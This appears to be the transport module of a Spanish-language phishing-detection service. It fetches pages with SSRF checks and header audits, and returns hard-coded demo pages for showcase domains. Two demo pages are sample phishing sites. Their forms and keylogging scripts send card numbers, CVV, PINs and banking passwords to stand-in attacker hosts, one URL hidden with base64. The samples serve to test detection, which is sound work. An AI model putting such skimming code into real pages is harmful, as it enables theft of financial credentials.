import type { TransportAuditResult } from '../types.ts';
import { SsrfGuardService, SsrfViolationError } from './ssrf-guard.service.ts';

const MAX_REDIRECTS = 5;
const FETCH_TIMEOUT_MS = 5000;
const MAX_HTML_BYTES = 2 * 1024 * 1024; // 2 MB

const USER_AGENTS: Record<string, string> = {
  android:
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36 Detector360-Forensic/1.0',
  iphone:
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1 Detector360-Forensic/1.0',
  desktop:
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Detector360-Forensic/1.0',
};

export class TransportFetchError extends Error {
  public readonly code: string;
  public readonly statusCode: number;
  constructor(code: string, message: string, statusCode = 502) {
    super(message);
    this.name = 'TransportFetchError';
    this.code = code;
    this.statusCode = statusCode;
  }
}

export class TransportService {
  static async fetchAndAudit(
    rawUrl: string,
    deviceProfile: string = 'android'
  ): Promise<TransportAuditResult> {
    const initialUrl = SsrfGuardService.validatePublicUrl(rawUrl);
    const domainLower = initialUrl.hostname.toLowerCase();

    // Built-in interactive showcase targets for instant commercial demos & offline testing
    const demoPayload = this.getShowcaseDemoPayload(initialUrl, domainLower);
    if (demoPayload) {
      return demoPayload;
    }

    const userAgent = USER_AGENTS[deviceProfile] || USER_AGENTS.android;
    let currentUrl = initialUrl;
    let redirectCount = 0;
    let response: Response | null = null;

    while (redirectCount <= MAX_REDIRECTS) {
      try {
        response = await fetch(currentUrl.toString(), {
          method: 'GET',
          redirect: 'manual',
          signal: AbortSignal.timeout(FETCH_TIMEOUT_MS),
          headers: {
            'User-Agent': userAgent,
            Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
          },
        });
      } catch (err) {
        if (err instanceof SsrfViolationError) throw err;
        throw new TransportFetchError(
          'TARGET_UNREACHABLE',
          'No pudimos conectar con esa página web (puede que ya haya sido dada de baja o el enlace esté mal escrito).',
          502
        );
      }

      if (response.status >= 300 && response.status < 400) {
        const location = response.headers.get('location');
        if (!location) break;

        redirectCount++;
        if (redirectCount > MAX_REDIRECTS) {
          throw new TransportFetchError(
            'TOO_MANY_REDIRECTS',
            'Esta página intenta redirigir demasiadas veces seguidas (comportamiento sospechoso).',
            502
          );
        }

        let resolvedRedirect: string;
        try {
          resolvedRedirect = new URL(location, currentUrl).toString();
        } catch {
          throw new SsrfViolationError('Redirección hacia una dirección inválida.');
        }

        // Re-validate every redirect hop against Anti-SSRF rules
        currentUrl = SsrfGuardService.validatePublicUrl(resolvedRedirect);
        continue;
      }

      break;
    }

    if (!response) {
      throw new TransportFetchError(
        'EMPTY_RESPONSE',
        'El servidor destino no devolvió respuesta.',
        502
      );
    }

    const htmlContent = await this.readBodyLimited(response, MAX_HTML_BYTES);
    const protocol: 'http' | 'https' = currentUrl.protocol === 'https:' ? 'https' : 'http';

    const hasHsts = Boolean(response.headers.get('strict-transport-security'));
    const hasCsp = Boolean(response.headers.get('content-security-policy'));
    const hasXfo = Boolean(
      response.headers.get('x-frame-options') ||
        (response.headers.get('content-security-policy') || '').includes('frame-ancestors')
    );

    return {
      finalUrl: currentUrl.toString(),
      targetDomain: currentUrl.hostname.toLowerCase(),
      protocol,
      isHttps: protocol === 'https',
      httpStatusCode: response.status,
      redirectCount,
      securityHeaders: {
        strict_transport_security: hasHsts,
        content_security_policy: hasCsp,
        x_frame_options: hasXfo,
      },
      htmlContent,
      simulatedDemo: false,
    };
  }

  private static async readBodyLimited(response: Response, maxBytes: number): Promise<string> {
    if (!response.body) {
      return '';
    }
    const reader = response.body.getReader();
    const chunks: Uint8Array[] = [];
    let totalBytes = 0;

    try {
      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        if (value) {
          totalBytes += value.byteLength;
          if (totalBytes > maxBytes) {
            const allowedSlice = value.slice(0, Math.max(0, value.byteLength - (totalBytes - maxBytes)));
            if (allowedSlice.byteLength > 0) chunks.push(allowedSlice);
            await reader.cancel();
            break;
          }
          chunks.push(value);
        }
      }
    } finally {
      reader.releaseLock();
    }

    const combined = new Uint8Array(Math.min(totalBytes, maxBytes));
    let offset = 0;
    for (const chunk of chunks) {
      combined.set(chunk, offset);
      offset += chunk.byteLength;
    }

    return new TextDecoder('utf-8', { fatal: false }).decode(combined);
  }

  private static getShowcaseDemoPayload(
    parsedUrl: URL,
    domainLower: string
  ): TransportAuditResult | null {
    // 1. Safe verified showcase
    if (
      domainLower.endsWith('.detector360.ejemplo') ||
      domainLower === 'banco-oficial-seguro.ejemplo.com' ||
      domainLower === 'comercio-seguro.ejemplo.com'
    ) {
      const html = [
        '<!DOCTYPE html>',
        '<html lang="es">',
        '<head>',
        '  <meta charset="UTF-8">',
        '  <title>Portal Oficial Verificado - Banca en Línea</title>',
        '</head>',
        '<body>',
        '  <header class="official-header">',
        '    <h1>Acceso Clientes Verificado</h1>',
        '  </header>',
        '  <main>',
        `    <form id="secure-login" action="https://${domainLower}/api/auth" method="POST" autocomplete="off">`,
        '      <label for="user_id">Usuario</label>',
        '      <input type="text" id="user_id" name="username" required>',
        '      <label for="user_pass">Contraseña Segura</label>',
        '      <input type="password" id="user_pass" name="password" required>',
        '      <button type="submit">Ingresar con Cifrado TLS 1.3</button>',
        '    </form>',
        '  </main>',
        '</body>',
        '</html>',
      ].join('\n');

      return {
        finalUrl: `https://${domainLower}${parsedUrl.pathname}`,
        targetDomain: domainLower,
        protocol: 'https',
        isHttps: true,
        httpStatusCode: 200,
        redirectCount: 0,
        securityHeaders: {
          strict_transport_security: true,
          content_security_policy: true,
          x_frame_options: true,
        },
        htmlContent: html,
        simulatedDemo: true,
      };
    }

    // 2. Warning showcase (HTTPS without security headers or minor risk)
    if (domainLower === 'tienda-sin-cabeceras.ejemplo.org') {
      const html = [
        '<!DOCTYPE html>',
        '<html lang="es">',
        '<head><title>Catálogo Local de Ofertas</title></head>',
        '<body>',
        '  <h2>Suscríbete a nuestro boletín</h2>',
        '  <form id="newsletter" action="/suscribir" method="POST">',
        '    <input type="email" name="correo" placeholder="Tu correo electrónico">',
        '    <button type="submit">Suscribirme</button>',
        '  </form>',
        '</body>',
        '</html>',
      ].join('\n');

      return {
        finalUrl: parsedUrl.toString(),
        targetDomain: domainLower,
        protocol: parsedUrl.protocol === 'https:' ? 'https' : 'http',
        isHttps: parsedUrl.protocol === 'https:',
        httpStatusCode: 200,
        redirectCount: 1,
        securityHeaders: {
          strict_transport_security: false,
          content_security_policy: false,
          x_frame_options: false,
        },
        htmlContent: html,
        simulatedDemo: true,
      };
    }

    // 3. Phishing / Fraud showcases (*.ejemplo.xyz or *.phishing-demo.xyz)
    if (domainLower.endsWith('.ejemplo.xyz') || domainLower.endsWith('.phishing-demo.xyz')) {
      const isPackageScam = domainLower.includes('paquete') || domainLower.includes('envio');
      if (isPackageScam) {
        const html = [
          '<!DOCTYPE html>',
          '<html lang="es">',
          '<head>',
          '  <meta charset="UTF-8">',
          '  <title>Aviso Urgente: Paquete Retenido en Aduana</title>',
          '</head>',
          '<body>',
          '  <div class="alert-box">',
          '    <h1>Su envío #ENV-88412 requiere pago de liberación ($1.99)</h1>',
          '  </div>',
          '  <div class="checkout-card">',
          '    <form id="card-payment" action="http://cobro-externo-99.xyz/procesar.php" method="POST">',
          '      <input type="text" name="cedula_titular" placeholder="Documento de Identidad / Cédula" required>',
          '      <input type="text" name="card_number" placeholder="Número de Tarjeta (16 dígitos)" required>',
          '      <input type="text" name="cvv_code" placeholder="Código CVV reverso" required>',
          '      <button type="submit">Pagar Impuesto y Liberar Paquete</button>',
          '    </form>',
          '  </div>',
          '  <script>',
          '    document.addEventListener("keyup", function(ev) {',
          '      fetch("http://recolector-tarjetas-oculto.xyz/log", { method: "POST", body: ev.target.value });',
          '    });',
          '  </script>',
          '</body>',
          '</html>',
        ].join('\n');

        return {
          finalUrl: parsedUrl.toString(),
          targetDomain: domainLower,
          protocol: parsedUrl.protocol === 'https:' ? 'https' : 'http',
          isHttps: parsedUrl.protocol === 'https:',
          httpStatusCode: 200,
          redirectCount: 1,
          securityHeaders: {
            strict_transport_security: false,
            content_security_policy: false,
            x_frame_options: false,
          },
          htmlContent: html,
          simulatedDemo: true,
        };
      }

      // Default banking / credential phishing showcase
      const html = [
        '<!DOCTYPE html>',
        '<html lang="es">',
        '<head>',
        '  <meta charset="UTF-8">',
        '  <title>Verificación Obligatoria de Seguridad Bancaria</title>',
        '</head>',
        '<body>',
        '  <div class="bank-clone-container">',
        '    <h2>Evite el bloqueo preventivo de su cuenta hoy</h2>',
        '    <p>Confirme sus credenciales y clave de operaciones especiales:</p>',
        '    <form id="login-banco" action="http://robo-datos.xyz/captura.php" method="POST">',
        '      <input type="text" name="documento_cedula" placeholder="Cédula o RIF" required>',
        '      <input type="text" name="clave_bancaria" placeholder="Contraseña de Internet Banking" required>',
        '      <input type="password" name="pin_cajero" placeholder="PIN de Tarjeta de Débito (4 dígitos)" required>',
        '      <button type="submit">Verificar Mi Cuenta Ahora</button>',
        '    </form>',
        '  </div>',
        '  <script>',
        '    const _0xspy = atob("aHR0cDovL3JvYm8tZGF0b3MueHl6L2tleWxvZw==");',
        '    document.querySelectorAll("input").forEach((el) => {',
        '      el.addEventListener("keyup", (e) => navigator.sendBeacon(_0xspy, e.target.value));',
        '    });',
        '  </script>',
        '</body>',
        '</html>',
      ].join('\n');

      return {
        finalUrl: parsedUrl.toString(),
        targetDomain: domainLower,
        protocol: parsedUrl.protocol === 'https:' ? 'https' : 'http',
        isHttps: parsedUrl.protocol === 'https:',
        httpStatusCode: 200,
        redirectCount: 2,
        securityHeaders: {
          strict_transport_security: false,
          content_security_policy: false,
          x_frame_options: false,
        },
        htmlContent: html,
        simulatedDemo: true,
      };
    }

    return null;
  }
}
